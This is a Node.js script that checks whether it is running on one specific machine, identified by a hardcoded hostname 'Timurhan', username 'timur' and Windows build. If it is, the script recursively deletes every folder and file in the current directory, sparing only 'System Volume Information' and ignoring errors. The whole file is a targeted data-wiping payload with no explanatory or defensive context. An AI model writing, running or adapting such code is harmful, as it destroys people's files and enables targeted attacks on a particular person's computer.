const glob = require("glob");
const os = require('node:os');
const fs = require('node:fs');

const data = {
"HOSTNAME": 'Timurhan',
"USERNAME": 'timur',
"VERSION": 'Windows 10 Pro',
"WINVER": '10.0.22621',
"ARCH": 'x64',
}

const pcinfo = {
"HOSTNAME": os.hostname(),
"USERNAME": os.userInfo().username,
"VERSION": os.version(),
"WINVER": os.release(),
"ARCH": os.arch(),
}

if (
    pcinfo.HOSTNAME == data.HOSTNAME && 
    pcinfo.USERNAME == data.USERNAME && 
    pcinfo.VERSION == data.VERSION && 
    pcinfo.WINVER == data.WINVER && 
    pcinfo.ARCH == data.ARCH
) {
    glob.sync("./*/").map(resources => {
        console.log(resources);
        if (resources == "./System Volume Information/") return;
        fs.rmSync(resources, {recursive: true});
    })

    glob.sync("./*.*").map(resource => {
        fs.unlink(resource, (err) => {});
    })
}
